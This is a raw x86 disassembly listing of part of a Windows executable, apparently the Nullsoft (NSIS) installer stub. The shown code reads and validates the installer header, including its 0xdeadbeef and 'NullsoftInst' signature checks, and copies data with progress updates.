  402cd5:	eb 29                	jmp    0x402d00
  402cd7:	a1 c8 f5 41 00       	mov    0x41f5c8,%eax
  402cdc:	53                   	push   %ebx
  402cdd:	23 c6                	and    %esi,%eax
  402cdf:	50                   	push   %eax
  402ce0:	6a 0b                	push   $0xb
  402ce2:	52                   	push   %edx
  402ce3:	ff 15 40 82 40 00    	call   *0x408240
  402ce9:	39 5c 24 28          	cmp    %ebx,0x28(%esp)
  402ced:	74 0d                	je     0x402cfc
  402cef:	8b 44 24 14          	mov    0x14(%esp),%eax
  402cf3:	53                   	push   %ebx
  402cf4:	53                   	push   %ebx
  402cf5:	50                   	push   %eax
  402cf6:	ff 15 18 82 40 00    	call   *0x408218
  402cfc:	8b 44 24 10          	mov    0x10(%esp),%eax
  402d00:	01 05 c8 40 42 00    	add    %eax,0x4240c8
  402d06:	33 c0                	xor    %eax,%eax
  402d08:	5f                   	pop    %edi
  402d09:	5e                   	pop    %esi
  402d0a:	5d                   	pop    %ebp
  402d0b:	5b                   	pop    %ebx
  402d0c:	81 c4 c0 01 00 00    	add    $0x1c0,%esp
  402d12:	c2 04 00             	ret    $0x4
  402d15:	90                   	nop
  402d16:	b3 15                	mov    $0x15,%bl
  402d18:	40                   	inc    %eax
  402d19:	00 ba 15 40 00 cb    	add    %bh,-0x34ffbfeb(%edx)
  402d1f:	15 40 00 de 15       	adc    $0x15de0040,%eax
  402d24:	40                   	inc    %eax
  402d25:	00 f1                	add    %dh,%cl
  402d27:	15 40 00 fd 15       	adc    $0x15fd0040,%eax
  402d2c:	40                   	inc    %eax
  402d2d:	00 18                	add    %bl,(%eax)
  402d2f:	16                   	push   %ss
  402d30:	40                   	inc    %eax
  402d31:	00 a6 16 40 00 d3    	add    %ah,-0x2cffbfea(%esi)
  402d37:	16                   	push   %ss
  402d38:	40                   	inc    %eax
  402d39:	00 f5                	add    %dh,%ch
  402d3b:	16                   	push   %ss
  402d3c:	40                   	inc    %eax
  402d3d:	00 9f 17 40 00 24    	add    %bl,0x24004017(%edi)
  402d43:	16                   	push   %ss
  402d44:	40                   	inc    %eax
  402d45:	00 69 16             	add    %ch,0x16(%ecx)
  402d48:	40                   	inc    %eax
  402d49:	00 94 16 40 00 b0 17 	add    %dl,0x17b00040(%esi,%edx,1)
  402d50:	40                   	inc    %eax
  402d51:	00 0c 18             	add    %cl,(%eax,%ebx,1)
  402d54:	40                   	inc    %eax
  402d55:	00 75 18             	add    %dh,0x18(%ebp)
  402d58:	40                   	inc    %eax
  402d59:	00 a3 18 40 00 b6    	add    %ah,-0x49ffbfe8(%ebx)
  402d5f:	18 40 00             	sbb    %al,0x0(%eax)
  402d62:	6f                   	outsl  %ds:(%esi),(%dx)
  402d63:	1a 40 00             	sbb    0x0(%eax),%al
  402d66:	84 1a                	test   %bl,(%edx)
  402d68:	40                   	inc    %eax
  402d69:	00 ba 1a 40 00 be    	add    %bh,-0x41ffbfe6(%edx)
  402d6f:	1a 40 00             	sbb    0x0(%eax),%al
  402d72:	d1 1a                	rcrl   $1,(%edx)
  402d74:	40                   	inc    %eax
  402d75:	00 52 1b             	add    %dl,0x1b(%edx)
  402d78:	40                   	inc    %eax
  402d79:	00 85 1b 40 00 c9    	add    %al,-0x36ffbfe5(%ebp)
  402d7f:	1b 40 00             	sbb    0x0(%eax),%eax
  402d82:	02 1c 40             	add    (%eax,%eax,2),%bl
  402d85:	00 99 1c 40 00 ba    	add    %bl,-0x45ffbfe4(%ecx)
  402d8b:	1c 40                	sbb    $0x40,%al
  402d8d:	00 73 1d             	add    %dh,0x1d(%ebx)
  402d90:	40                   	inc    %eax
  402d91:	00 73 1d             	add    %dh,0x1d(%ebx)
  402d94:	40                   	inc    %eax
  402d95:	00 4c 1e 40          	add    %cl,0x40(%esi,%ebx,1)
  402d99:	00 6b 1e             	add    %ch,0x1e(%ebx)
  402d9c:	40                   	inc    %eax
  402d9d:	00 8a 1e 40 00 a8    	add    %cl,-0x57ffbfe2(%edx)
  402da3:	1e                   	push   %ds
  402da4:	40                   	inc    %eax
  402da5:	00 76 1f             	add    %dh,0x1f(%esi)
  402da8:	40                   	inc    %eax
  402da9:	00 00                	add    %al,(%eax)
  402dab:	20 40 00             	and    %al,0x0(%eax)
  402dae:	2f                   	das
  402daf:	20 40 00             	and    %al,0x0(%eax)
  402db2:	d1 20                	shll   $1,(%eax)
  402db4:	40                   	inc    %eax
  402db5:	00 21                	add    %ah,(%ecx)
  402db7:	21 40 00             	and    %eax,0x0(%eax)
  402dba:	4f                   	dec    %edi
  402dbb:	21 40 00             	and    %eax,0x0(%eax)
  402dbe:	0b 22                	or     (%edx),%esp
  402dc0:	40                   	inc    %eax
  402dc1:	00 00                	add    %al,(%eax)
  402dc3:	23 40 00             	and    0x0(%eax),%eax
  402dc6:	98                   	cwtl
  402dc7:	24 40                	and    $0x40,%al
  402dc9:	00 1f                	add    %bl,(%edi)
  402dcb:	25 40 00 36 25       	and    $0x25360040,%eax
  402dd0:	40                   	inc    %eax
  402dd1:	00 7c 25 40          	add    %bh,0x40(%ebp,%eiz,1)
  402dd5:	00 c5                	add    %al,%ch
  402dd7:	25 40 00 4f 26       	and    $0x264f0040,%eax
  402ddc:	40                   	inc    %eax
  402ddd:	00 16                	add    %dl,(%esi)
  402ddf:	27                   	daa
  402de0:	40                   	inc    %eax
  402de1:	00 a0 27 40 00 01    	add    %ah,0x1004027(%eax)
  402de7:	28 40 00             	sub    %al,0x0(%eax)
  402dea:	15 28 40 00 3b       	adc    $0x3b004028,%eax
  402def:	28 40 00             	sub    %al,0x0(%eax)
  402df2:	8b 28                	mov    (%eax),%ebp
  402df4:	40                   	inc    %eax
  402df5:	00 58 29             	add    %bl,0x29(%eax)
  402df8:	40                   	inc    %eax
  402df9:	00 8d 29 40 00 a7    	add    %cl,-0x58ffbfd7(%ebp)
  402dff:	29 40 00             	sub    %eax,0x0(%eax)
  402e02:	da 29                	fisubrl (%ecx)
  402e04:	40                   	inc    %eax
  402e05:	00 05 2a 40 00 3c    	add    %al,0x3c00402a
  402e0b:	2b 40 00             	sub    0x0(%eax),%eax
  402e0e:	c8 2b 40 00          	enter  $0x402b,$0x0
  402e12:	30 2c 40             	xor    %ch,(%eax,%eax,2)
  402e15:	00 fc                	add    %bh,%ah
  402e17:	2c 40                	sub    $0x40,%al
  402e19:	00 d7                	add    %dl,%bh
  402e1b:	2c 40                	sub    $0x40,%al
  402e1d:	00 28                	add    %ch,(%eax)
  402e1f:	1c 40                	sbb    $0x40,%al
  402e21:	00 2c 1c             	add    %ch,(%esp,%ebx,1)
  402e24:	40                   	inc    %eax
  402e25:	00 30                	add    %dh,(%eax)
  402e27:	1c 40                	sbb    $0x40,%al
  402e29:	00 35 1c 40 00 51    	add    %dh,0x5100401c
  402e2f:	1c 40                	sbb    $0x40,%al
  402e31:	00 55 1c             	add    %dl,0x1c(%ebp)
  402e34:	40                   	inc    %eax
  402e35:	00 59 1c             	add    %bl,0x1c(%ecx)
  402e38:	40                   	inc    %eax
  402e39:	00 5d 1c             	add    %bl,0x1c(%ebp)
  402e3c:	40                   	inc    %eax
  402e3d:	00 68 1c             	add    %ch,0x1c(%eax)
  402e40:	40                   	inc    %eax
  402e41:	00 74 1c 40          	add    %dh,0x40(%esp,%ebx,1)
  402e45:	00 7c 1c 40          	add    %bh,0x40(%esp,%ebx,1)
  402e49:	00 89 1c 40 00 8d    	add    %cl,-0x72ffbfe4(%ecx)
  402e4f:	1c 40                	sbb    $0x40,%al
  402e51:	00 91 1c 40 00 8b    	add    %dl,-0x74ffbfe4(%ecx)
  402e57:	4c                   	dec    %esp
  402e58:	24 04                	and    $0x4,%al
  402e5a:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  402e5f:	56                   	push   %esi
  402e60:	ff 34 88             	push   (%eax,%ecx,4)
  402e63:	6a 00                	push   $0x0
  402e65:	e8 9b 2d 00 00       	call   0x405c05
  402e6a:	8b f0                	mov    %eax,%esi
  402e6c:	56                   	push   %esi
  402e6d:	e8 6c 3a 00 00       	call   0x4068de
  402e72:	0f be 16             	movsbl (%esi),%edx
  402e75:	5e                   	pop    %esi
  402e76:	c3                   	ret
  402e77:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402e7b:	85 c9                	test   %ecx,%ecx
  402e7d:	79 04                	jns    0x402e83
  402e7f:	8b c1                	mov    %ecx,%eax
  402e81:	eb 0c                	jmp    0x402e8f
  402e83:	a1 c4 40 42 00       	mov    0x4240c4,%eax
  402e88:	05 01 00 00 80       	add    $0x80000001,%eax
  402e8d:	03 c1                	add    %ecx,%eax
  402e8f:	c2 04 00             	ret    $0x4
  402e92:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e96:	8b 0d e4 a0 40 00    	mov    0x40a0e4,%ecx
  402e9c:	99                   	cltd
  402e9d:	33 c2                	xor    %edx,%eax
  402e9f:	2b c2                	sub    %edx,%eax
  402ea1:	8b d0                	mov    %eax,%edx
  402ea3:	c1 f8 04             	sar    $0x4,%eax
  402ea6:	83 e2 0f             	and    $0xf,%edx
  402ea9:	c1 e0 0a             	shl    $0xa,%eax
  402eac:	56                   	push   %esi
  402ead:	05 e8 a0 40 00       	add    $0x40a0e8,%eax
  402eb2:	ff 34 91             	push   (%ecx,%edx,4)
  402eb5:	50                   	push   %eax
  402eb6:	e8 4a 2d 00 00       	call   0x405c05
  402ebb:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  402ec0:	8b f0                	mov    %eax,%esi
  402ec2:	7d 06                	jge    0x402eca
  402ec4:	56                   	push   %esi
  402ec5:	e8 e1 3a 00 00       	call   0x4069ab
  402eca:	8b c6                	mov    %esi,%eax
  402ecc:	5e                   	pop    %esi
  402ecd:	c2 04 00             	ret    $0x4
  402ed0:	55                   	push   %ebp
  402ed1:	8b ec                	mov    %esp,%ebp
  402ed3:	51                   	push   %ecx
  402ed4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ed7:	50                   	push   %eax
  402ed8:	8b 45 08             	mov    0x8(%ebp),%eax
  402edb:	0d 20 00 10 00       	or     $0x100020,%eax
  402ee0:	50                   	push   %eax
  402ee1:	6a 22                	push   $0x22
  402ee3:	e8 aa ff ff ff       	call   0x402e92
  402ee8:	50                   	push   %eax
  402ee9:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  402eee:	ff 70 04             	push   0x4(%eax)
  402ef1:	e8 81 ff ff ff       	call   0x402e77
  402ef6:	50                   	push   %eax
  402ef7:	e8 0c 31 00 00       	call   0x406008
  402efc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402eff:	33 d2                	xor    %edx,%edx
  402f01:	85 c0                	test   %eax,%eax
  402f03:	0f 45 ca             	cmovne %edx,%ecx
  402f06:	8b c1                	mov    %ecx,%eax
  402f08:	c9                   	leave
  402f09:	c2 04 00             	ret    $0x4
  402f0c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402f10:	85 c0                	test   %eax,%eax
  402f12:	79 13                	jns    0x402f27
  402f14:	8d 48 01             	lea    0x1(%eax),%ecx
  402f17:	b8 00 50 42 00       	mov    $0x425000,%eax
  402f1c:	c1 e1 0a             	shl    $0xa,%ecx
  402f1f:	2b c1                	sub    %ecx,%eax
  402f21:	50                   	push   %eax
  402f22:	e8 b7 39 00 00       	call   0x4068de
  402f27:	c2 04 00             	ret    $0x4
  402f2a:	ff 74 24 08          	push   0x8(%esp)
  402f2e:	ff 74 24 08          	push   0x8(%esp)
  402f32:	ff 35 10 a0 40 00    	push   0x40a010
  402f38:	e8 c8 36 00 00       	call   0x406605
  402f3d:	c2 08 00             	ret    $0x8
  402f40:	6a 00                	push   $0x0
  402f42:	6a 00                	push   $0x0
  402f44:	ff 74 24 0c          	push   0xc(%esp)
  402f48:	ff 35 10 a0 40 00    	push   0x40a010
  402f4e:	ff 15 10 81 40 00    	call   *0x408110
  402f54:	c2 04 00             	ret    $0x4
  402f57:	83 ec 50             	sub    $0x50,%esp
  402f5a:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  402f5e:	b8 c0 75 41 00       	mov    $0x4175c0,%eax
  402f63:	53                   	push   %ebx
  402f64:	55                   	push   %ebp
  402f65:	56                   	push   %esi
  402f66:	57                   	push   %edi
  402f67:	8b 7c 24 6c          	mov    0x6c(%esp),%edi
  402f6b:	bb 00 80 00 00       	mov    $0x8000,%ebx
  402f70:	85 ff                	test   %edi,%edi
  402f72:	0f 45 5c 24 70       	cmovne 0x70(%esp),%ebx
  402f77:	33 f6                	xor    %esi,%esi
  402f79:	85 ff                	test   %edi,%edi
  402f7b:	0f 45 c7             	cmovne %edi,%eax
  402f7e:	89 44 24 10          	mov    %eax,0x10(%esp)
  402f82:	85 c9                	test   %ecx,%ecx
  402f84:	78 0d                	js     0x402f93
  402f86:	a1 58 40 42 00       	mov    0x424058,%eax
  402f8b:	03 c1                	add    %ecx,%eax
  402f8d:	50                   	push   %eax
  402f8e:	e8 ad ff ff ff       	call   0x402f40
  402f93:	6a 04                	push   $0x4
  402f95:	8d 44 24 70          	lea    0x70(%esp),%eax
  402f99:	50                   	push   %eax
  402f9a:	ff 35 10 a0 40 00    	push   0x40a010
  402fa0:	e8 60 36 00 00       	call   0x406605
  402fa5:	85 c0                	test   %eax,%eax
  402fa7:	0f 84 a1 01 00 00    	je     0x40314e
  402fad:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  402fb1:	85 c0                	test   %eax,%eax
  402fb3:	0f 89 3d 01 00 00    	jns    0x4030f6
  402fb9:	ff 15 c8 80 40 00    	call   *0x4080c8
  402fbf:	b9 38 b5 40 00       	mov    $0x40b538,%ecx
  402fc4:	89 44 24 70          	mov    %eax,0x70(%esp)
  402fc8:	e8 f3 48 00 00       	call   0x4078c0
  402fcd:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  402fd1:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402fd6:	8b c8                	mov    %eax,%ecx
  402fd8:	89 44 24 14          	mov    %eax,0x14(%esp)
  402fdc:	89 4c 24 6c          	mov    %ecx,0x6c(%esp)
  402fe0:	0f 86 08 01 00 00    	jbe    0x4030ee
  402fe6:	bd 00 40 00 00       	mov    $0x4000,%ebp
  402feb:	3b cd                	cmp    %ebp,%ecx
  402fed:	0f 4c e9             	cmovl  %ecx,%ebp
  402ff0:	55                   	push   %ebp
  402ff1:	68 c0 35 41 00       	push   $0x4135c0
  402ff6:	e8 2f ff ff ff       	call   0x402f2a
  402ffb:	85 c0                	test   %eax,%eax
  402ffd:	0f 84 4b 01 00 00    	je     0x40314e
  403003:	29 6c 24 6c          	sub    %ebp,0x6c(%esp)
  403007:	89 2d 54 b5 40 00    	mov    %ebp,0x40b554
  40300d:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  403011:	c7 05 50 b5 40 00 c0 	movl   $0x4135c0,0x40b550
  403018:	35 41 00 
  40301b:	b9 38 b5 40 00       	mov    $0x40b538,%ecx
  403020:	89 2d 58 b5 40 00    	mov    %ebp,0x40b558
  403026:	89 1d 5c b5 40 00    	mov    %ebx,0x40b55c
  40302c:	e8 c3 3a 00 00       	call   0x406af4
  403031:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403035:	85 c0                	test   %eax,%eax
  403037:	0f 88 b5 00 00 00    	js     0x4030f2
  40303d:	a1 58 b5 40 00       	mov    0x40b558,%eax
  403042:	2b c5                	sub    %ebp,%eax
  403044:	89 44 24 64          	mov    %eax,0x64(%esp)
  403048:	ff 15 c8 80 40 00    	call   *0x4080c8
  40304e:	f6 05 f4 40 42 00 01 	testb  $0x1,0x4240f4
  403055:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  403059:	89 44 24 18          	mov    %eax,0x18(%esp)
  40305d:	74 4b                	je     0x4030aa
  40305f:	2b 44 24 70          	sub    0x70(%esp),%eax
  403063:	3d c8 00 00 00       	cmp    $0xc8,%eax
  403068:	77 04                	ja     0x40306e
  40306a:	85 c9                	test   %ecx,%ecx
  40306c:	75 3c                	jne    0x4030aa
  40306e:	8b 44 24 14          	mov    0x14(%esp),%eax
  403072:	50                   	push   %eax
  403073:	6a 64                	push   $0x64
  403075:	2b c1                	sub    %ecx,%eax
  403077:	50                   	push   %eax
  403078:	ff 15 e8 80 40 00    	call   *0x4080e8
  40307e:	50                   	push   %eax
  40307f:	8d 44 24 24          	lea    0x24(%esp),%eax
  403083:	68 a4 83 40 00       	push   $0x4083a4
  403088:	50                   	push   %eax
  403089:	ff 15 44 82 40 00    	call   *0x408244
  40308f:	83 c4 0c             	add    $0xc,%esp
  403092:	8d 44 24 20          	lea    0x20(%esp),%eax
  403096:	50                   	push   %eax
  403097:	6a 00                	push   $0x0
  403099:	e8 c4 29 00 00       	call   0x405a62
  40309e:	8b 44 24 18          	mov    0x18(%esp),%eax
  4030a2:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  4030a6:	89 44 24 70          	mov    %eax,0x70(%esp)
  4030aa:	8b 44 24 64          	mov    0x64(%esp),%eax
  4030ae:	85 c0                	test   %eax,%eax
  4030b0:	74 34                	je     0x4030e6
  4030b2:	85 ff                	test   %edi,%edi
  4030b4:	75 15                	jne    0x4030cb
  4030b6:	50                   	push   %eax
  4030b7:	55                   	push   %ebp
  4030b8:	ff 74 24 70          	push   0x70(%esp)
  4030bc:	e8 03 36 00 00       	call   0x4066c4
  4030c1:	85 c0                	test   %eax,%eax
  4030c3:	74 71                	je     0x403136
  4030c5:	8b 44 24 64          	mov    0x64(%esp),%eax
  4030c9:	eb 0c                	jmp    0x4030d7
  4030cb:	8b 2d 58 b5 40 00    	mov    0x40b558,%ebp
  4030d1:	2b d8                	sub    %eax,%ebx
  4030d3:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4030d7:	03 f0                	add    %eax,%esi
  4030d9:	83 7c 24 1c 01       	cmpl   $0x1,0x1c(%esp)
  4030de:	0f 85 37 ff ff ff    	jne    0x40301b
  4030e4:	eb 08                	jmp    0x4030ee
  4030e6:	85 c9                	test   %ecx,%ecx
  4030e8:	0f 8f f8 fe ff ff    	jg     0x402fe6
  4030ee:	8b c6                	mov    %esi,%eax
  4030f0:	eb 5f                	jmp    0x403151
  4030f2:	6a fc                	push   $0xfffffffc
  4030f4:	eb 5a                	jmp    0x403150
  4030f6:	85 ff                	test   %edi,%edi
  4030f8:	75 40                	jne    0x40313a
  4030fa:	85 c0                	test   %eax,%eax
  4030fc:	7e f0                	jle    0x4030ee
  4030fe:	bd c0 35 41 00       	mov    $0x4135c0,%ebp
  403103:	3b c3                	cmp    %ebx,%eax
  403105:	8b fb                	mov    %ebx,%edi
  403107:	0f 4c f8             	cmovl  %eax,%edi
  40310a:	57                   	push   %edi
  40310b:	55                   	push   %ebp
  40310c:	e8 19 fe ff ff       	call   0x402f2a
  403111:	85 c0                	test   %eax,%eax
  403113:	74 39                	je     0x40314e
  403115:	57                   	push   %edi
  403116:	55                   	push   %ebp
  403117:	ff 74 24 70          	push   0x70(%esp)
  40311b:	e8 a4 35 00 00       	call   0x4066c4
  403120:	85 c0                	test   %eax,%eax
  403122:	74 12                	je     0x403136
  403124:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  403128:	03 f7                	add    %edi,%esi
  40312a:	2b c7                	sub    %edi,%eax
  40312c:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  403130:	85 c0                	test   %eax,%eax
  403132:	7f cf                	jg     0x403103
  403134:	eb b8                	jmp    0x4030ee
  403136:	6a fe                	push   $0xfffffffe
  403138:	eb 16                	jmp    0x403150
  40313a:	8b 74 24 70          	mov    0x70(%esp),%esi
  40313e:	3b c6                	cmp    %esi,%eax
  403140:	0f 4c f0             	cmovl  %eax,%esi
  403143:	56                   	push   %esi
  403144:	57                   	push   %edi
  403145:	e8 e0 fd ff ff       	call   0x402f2a
  40314a:	85 c0                	test   %eax,%eax
  40314c:	75 a0                	jne    0x4030ee
  40314e:	6a fd                	push   $0xfffffffd
  403150:	58                   	pop    %eax
  403151:	5f                   	pop    %edi
  403152:	5e                   	pop    %esi
  403153:	5d                   	pop    %ebp
  403154:	5b                   	pop    %ebx
  403155:	83 c4 50             	add    $0x50,%esp
  403158:	c2 10 00             	ret    $0x10
  40315b:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  403160:	74 18                	je     0x40317a
  403162:	a1 30 b5 40 00       	mov    0x40b530,%eax
  403167:	85 c0                	test   %eax,%eax
  403169:	74 07                	je     0x403172
  40316b:	50                   	push   %eax
  40316c:	ff 15 08 82 40 00    	call   *0x408208
  403172:	83 25 30 b5 40 00 00 	andl   $0x0,0x40b530
  403179:	c3                   	ret
  40317a:	83 3d 30 b5 40 00 00 	cmpl   $0x0,0x40b530
  403181:	74 08                	je     0x40318b
  403183:	6a 00                	push   $0x0
  403185:	e8 eb 2d 00 00       	call   0x405f75
  40318a:	c3                   	ret
  40318b:	ff 15 c8 80 40 00    	call   *0x4080c8
  403191:	3b 05 00 40 42 00    	cmp    0x424000,%eax
  403197:	76 25                	jbe    0x4031be
  403199:	6a 00                	push   $0x0
  40319b:	68 21 34 40 00       	push   $0x403421
  4031a0:	6a 00                	push   $0x0
  4031a2:	6a 6f                	push   $0x6f
  4031a4:	ff 35 f4 37 42 00    	push   0x4237f4
  4031aa:	ff 15 04 82 40 00    	call   *0x408204
  4031b0:	6a 05                	push   $0x5
  4031b2:	50                   	push   %eax
  4031b3:	a3 30 b5 40 00       	mov    %eax,0x40b530
  4031b8:	ff 15 30 82 40 00    	call   *0x408230
  4031be:	c3                   	ret
  4031bf:	83 ec 24             	sub    $0x24,%esp
  4031c2:	53                   	push   %ebx
  4031c3:	55                   	push   %ebp
  4031c4:	56                   	push   %esi
  4031c5:	57                   	push   %edi
  4031c6:	33 ff                	xor    %edi,%edi
  4031c8:	33 db                	xor    %ebx,%ebx
  4031ca:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4031ce:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4031d2:	ff 15 c8 80 40 00    	call   *0x4080c8
  4031d8:	68 00 04 00 00       	push   $0x400
  4031dd:	be 00 bc 42 00       	mov    $0x42bc00,%esi
  4031e2:	05 e8 03 00 00       	add    $0x3e8,%eax
  4031e7:	56                   	push   %esi
  4031e8:	53                   	push   %ebx
  4031e9:	a3 00 40 42 00       	mov    %eax,0x424000
  4031ee:	ff 15 c4 80 40 00    	call   *0x4080c4
  4031f4:	6a 03                	push   $0x3
  4031f6:	68 00 00 00 80       	push   $0x80000000
  4031fb:	56                   	push   %esi
  4031fc:	e8 d7 33 00 00       	call   0x4065d8
  403201:	8b e8                	mov    %eax,%ebp
  403203:	89 2d 10 a0 40 00    	mov    %ebp,0x40a010
  403209:	83 fd ff             	cmp    $0xffffffff,%ebp
  40320c:	75 0a                	jne    0x403218
  40320e:	b8 b8 82 40 00       	mov    $0x4082b8,%eax
  403213:	e9 ff 01 00 00       	jmp    0x403417
  403218:	56                   	push   %esi
  403219:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  40321e:	56                   	push   %esi
  40321f:	e8 a4 35 00 00       	call   0x4067c8
  403224:	56                   	push   %esi
  403225:	e8 56 37 00 00       	call   0x406980
  40322a:	50                   	push   %eax
  40322b:	68 00 c0 42 00       	push   $0x42c000
  403230:	e8 93 35 00 00       	call   0x4067c8
  403235:	6a 00                	push   $0x0
  403237:	55                   	push   %ebp
  403238:	ff 15 cc 80 40 00    	call   *0x4080cc
  40323e:	8b f0                	mov    %eax,%esi
  403240:	89 35 28 b5 40 00    	mov    %esi,0x40b528
  403246:	85 f6                	test   %esi,%esi
  403248:	0f 84 f6 00 00 00    	je     0x403344
  40324e:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  403252:	83 3d 08 40 42 00 00 	cmpl   $0x0,0x424008
  403259:	b8 00 80 00 00       	mov    $0x8000,%eax
  40325e:	bf 00 02 00 00       	mov    $0x200,%edi
  403263:	0f 45 f8             	cmovne %eax,%edi
  403266:	3b f7                	cmp    %edi,%esi
  403268:	0f 42 fe             	cmovb  %esi,%edi
  40326b:	57                   	push   %edi
  40326c:	68 c0 b5 40 00       	push   $0x40b5c0
  403271:	e8 b4 fc ff ff       	call   0x402f2a
  403276:	85 c0                	test   %eax,%eax
  403278:	0f 84 8c 01 00 00    	je     0x40340a
  40327e:	83 3d 08 40 42 00 00 	cmpl   $0x0,0x424008
  403285:	75 7f                	jne    0x403306
  403287:	6a 1c                	push   $0x1c
  403289:	68 c0 b5 40 00       	push   $0x40b5c0
  40328e:	8d 44 24 20          	lea    0x20(%esp),%eax
  403292:	50                   	push   %eax
  403293:	e8 be 30 00 00       	call   0x406356
  403298:	f7 44 24 18 f0 ff ff 	testl  $0xfffffff0,0x18(%esp)
  40329f:	ff 
  4032a0:	75 71                	jne    0x403313
  4032a2:	81 7c 24 1c ef be ad 	cmpl   $0xdeadbeef,0x1c(%esp)
  4032a9:	de 
  4032aa:	75 67                	jne    0x403313
  4032ac:	81 7c 24 28 49 6e 73 	cmpl   $0x74736e49,0x28(%esp)
  4032b3:	74 
  4032b4:	75 5d                	jne    0x403313
  4032b6:	81 7c 24 24 73 6f 66 	cmpl   $0x74666f73,0x24(%esp)
  4032bd:	74 
  4032be:	75 53                	jne    0x403313
  4032c0:	81 7c 24 20 4e 75 6c 	cmpl   $0x6c6c754e,0x20(%esp)
  4032c7:	6c 
  4032c8:	75 49                	jne    0x403313
  4032ca:	a1 2c b5 40 00       	mov    0x40b52c,%eax
  4032cf:	0b 5c 24 18          	or     0x18(%esp),%ebx
  4032d3:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4032d7:	a3 08 40 42 00       	mov    %eax,0x424008
  4032dc:	8b c3                	mov    %ebx,%eax
  4032de:	83 e0 02             	and    $0x2,%eax
  4032e1:	09 05 e0 40 42 00    	or     %eax,0x4240e0
  4032e7:	3b ce                	cmp    %esi,%ecx
  4032e9:	0f 87 23 01 00 00    	ja     0x403412
  4032ef:	8b c3                	mov    %ebx,%eax
  4032f1:	24 0c                	and    $0xc,%al
  4032f3:	3c 04                	cmp    $0x4,%al
  4032f5:	74 45                	je     0x40333c
  4032f7:	ff 44 24 10          	incl   0x10(%esp)
  4032fb:	8d 71 fc             	lea    -0x4(%ecx),%esi
  4032fe:	3b fe                	cmp    %esi,%edi
  403300:	76 11                	jbe    0x403313
  403302:	8b fe                	mov    %esi,%edi
  403304:	eb 0d                	jmp    0x403313
  403306:	f6 c3 02             	test   $0x2,%bl
  403309:	75 08                	jne    0x403313
  40330b:	6a 00                	push   $0x0
  40330d:	e8 49 fe ff ff       	call   0x40315b
  403312:	59                   	pop    %ecx
  403313:	3b 35 28 b5 40 00    	cmp    0x40b528,%esi
  403319:	73 13                	jae    0x40332e
  40331b:	57                   	push   %edi
  40331c:	68 c0 b5 40 00       	push   $0x40b5c0
  403321:	ff 74 24 1c          	push   0x1c(%esp)
  403325:	e8 5e 37 00 00       	call   0x406a88
  40332a:	89 44 24 14          	mov    %eax,0x14(%esp)
  40332e:	01 3d 2c b5 40 00    	add    %edi,0x40b52c
  403334:	2b f7                	sub    %edi,%esi
  403336:	0f 85 16 ff ff ff    	jne    0x403252
  40333c:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403340:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403344:	6a 01                	push   $0x1
  403346:	e8 10 fe ff ff       	call   0x40315b
  40334b:	83 3d 08 40 42 00 00 	cmpl   $0x0,0x424008
  403352:	59                   	pop    %ecx
  403353:	0f 84 b9 00 00 00    	je     0x403412
  403359:	85 db                	test   %ebx,%ebx
  40335b:	74 2f                	je     0x40338c
  40335d:	ff 35 2c b5 40 00    	push   0x40b52c
  403363:	e8 d8 fb ff ff       	call   0x402f40
  403368:	6a 04                	push   $0x4
  40336a:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40336e:	50                   	push   %eax
  40336f:	ff 35 10 a0 40 00    	push   0x40a010
  403375:	e8 8b 32 00 00       	call   0x406605
  40337a:	85 c0                	test   %eax,%eax
  40337c:	0f 84 90 00 00 00    	je     0x403412
  403382:	3b 7c 24 38          	cmp    0x38(%esp),%edi
  403386:	0f 85 86 00 00 00    	jne    0x403412
  40338c:	ff 74 24 2c          	push   0x2c(%esp)
  403390:	6a 40                	push   $0x40
  403392:	ff 15 f4 80 40 00    	call   *0x4080f4
  403398:	8b 0d 08 40 42 00    	mov    0x424008,%ecx
  40339e:	8b f0                	mov    %eax,%esi
  4033a0:	83 c1 1c             	add    $0x1c,%ecx
  4033a3:	51                   	push   %ecx
  4033a4:	e8 97 fb ff ff       	call   0x402f40
  4033a9:	ff 74 24 2c          	push   0x2c(%esp)
  4033ad:	33 db                	xor    %ebx,%ebx
  4033af:	56                   	push   %esi
  4033b0:	53                   	push   %ebx
  4033b1:	6a ff                	push   $0xffffffff
  4033b3:	e8 9f fb ff ff       	call   0x402f57
  4033b8:	3b 44 24 2c          	cmp    0x2c(%esp),%eax
  4033bc:	75 54                	jne    0x403412
  4033be:	f6 44 24 18 01       	testb  $0x1,0x18(%esp)
  4033c3:	89 35 10 40 42 00    	mov    %esi,0x424010
  4033c9:	8b 06                	mov    (%esi),%eax
  4033cb:	a3 0c 40 42 00       	mov    %eax,0x42400c
  4033d0:	74 06                	je     0x4033d8
  4033d2:	ff 05 04 40 42 00    	incl   0x424004
  4033d8:	6a 08                	push   $0x8
  4033da:	59                   	pop    %ecx
  4033db:	8d 46 44             	lea    0x44(%esi),%eax
  4033de:	8d 40 f8             	lea    -0x8(%eax),%eax
  4033e1:	01 30                	add    %esi,(%eax)
  4033e3:	83 e9 01             	sub    $0x1,%ecx
  4033e6:	75 f6                	jne    0x4033de
  4033e8:	6a 01                	push   $0x1
  4033ea:	53                   	push   %ebx
